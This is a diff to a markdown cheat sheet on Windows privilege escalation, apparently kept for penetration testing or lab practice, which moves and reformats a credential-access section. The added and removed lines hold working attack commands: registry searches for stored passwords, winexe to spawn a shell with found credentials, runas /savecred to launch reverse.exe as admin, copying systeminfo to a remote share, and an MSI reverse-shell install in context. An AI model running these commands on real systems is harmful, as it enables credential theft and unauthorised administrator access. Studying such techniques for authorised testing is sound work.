@@ -661,7 +661,53 @@ python3 exploit.py
 
 <br />
 
-#### Kernel Exploits
+### Credential Access
+
+```bash
+#######################################################################
+##### 1. Credentials from registry ####################################
+#######################################################################
+
+# Using Winpeas
+.\winPEASany.exe quiet filesinfo userinfo
+
+# Manual search (Local Machine and Current User)
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+# Manual query for confirmation
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+# On Kali, we can use the winexe command to spawn a shell using these credentials
+winexe -U '{USER}%{PASSWORD}' //{IP ADDRESS} cmd.exe
+
+
+#########################################################################
+#### 2. Credentials from cmdkey #########################################
+#########################################################################
+
+# Using Winpeas
+.\winPEASany.exe quiet cmd windowscreds
+
+# We can verify this manually using the following command:
+cmdkey /list
+
+# If the saved credentials aren’t present, run the following script to refresh the credential:
+C:\PrivEsc\savecred.bat
+
+# We can use the saved credential to run any command as the admin user
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+#########################################################################
+#### 3. Credentials from configuration files ############################
+#########################################################################
+
+```
+<br />
+
+### Exploits
+
+<br />
 
 [Windows Expoit Suggestor](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
 
@@ -675,8 +721,13 @@ systeminfo > \\{Client IP ADDRESS}\systeminfo.txt
 # Use Windows exploit suggestor to find availble kernel exploit
 python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
 ```
+<br />
 
-#### Service Exploits
+### Misconfiguration
+
+<br />
+
+#### Services
 
 ```ps1
 # Enumeration
@@ -828,50 +879,8 @@ msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 
 ```
 
-</br>
+<br />
 
-#### Credential Access
-
-```bash
-
-# 1. Credentials from registry 
-
-
-# Using Winpeas
-.\winPEASany.exe quiet filesinfo userinfo
-
-# Manual search (Local Machine and Current User)
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-
-# Manual query for confirmation
-reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
-
-# On Kali, we can use the winexe command to spawn a shell using these credentials
-winexe -U '{USER}%{PASSWORD}' //{IP ADDRESS} cmd.exe
-
-
-
-2. Credentials from cmdkey
-
-
-# Using Winpeas
-.\winPEASany.exe quiet cmd windowscreds
-
-# We can verify this manually using the following command:
-cmdkey /list
-
-# If the saved credentials aren’t present, run the following script to refresh the credential:
-C:\PrivEsc\savecred.bat
-
-# We can use the saved credential to run any command as the admin user
-runas /savecred /user:admin C:\PrivEsc\reverse.exe
-
-
-3. Credentials from configuration files
-
-
-```
 
 
 ```bash
